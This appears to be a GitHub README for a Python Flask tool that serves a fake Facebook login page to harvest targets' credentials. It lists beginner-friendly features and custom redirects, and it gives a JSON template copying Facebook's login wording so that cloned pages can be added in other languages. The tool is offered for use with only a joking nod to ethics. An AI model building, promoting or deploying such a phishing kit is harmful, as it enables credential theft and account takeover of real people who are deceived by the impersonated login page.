# A Simple Facebook Phishing Framework

Quickly fire up a Web Server written in Python(Flask) and phish for your facebook targets (ethicaly ofc).

[![DemoPage](https://raw.githubusercontent.com/Wh1ter0sEo4/SimpleFacebookPhishingPage/demo/demo.png)](https://wh1ter0seo4.github.io/SimpleFacebookPhishingPage/demo/)

## Features

- Multi-Lang Support.
- Custom Redirect Link.
- Config Files, Customize to your liking without having to edit the source code.
- Cross Platform.
- Newbie Friendly.

## Platforms

Tested Platforms.

| Platform | Status |
| ------ | ------ |
| Linux | ✅ |
| Windows | - |
| MacOS | ✅ |
| BSD | ❌ |

## Availble Languages

| Language | Status |
| ------ | ------ |
| English | ✅ |
| French | ✅ |
| Spanish | - |
| Arabic | - |

If the language you're looking for isn't availble, creating new language is as easy as it gets, you just have to get your hands a little dirty.

1 - Create a new json file in the langpkg directory.

2 - Paste the following and change the values to the coresponding language.

```sh
{
	"title": "Facebook – log in or sign up", 
	"motd": "Facebook helps you connect and share with the people in your life.",
	"email": "Email address or phone number"	,
	"password": "Password",
	"login": "Log In",
	"forgot": "Forgotten password?",
	"new-account": "Create New Account",
	"new-page": "Create a Page%end_bold% for a celebrity, brand or business."
}
```
%end_bold% is where the bold part should end in the new-page paragraph.
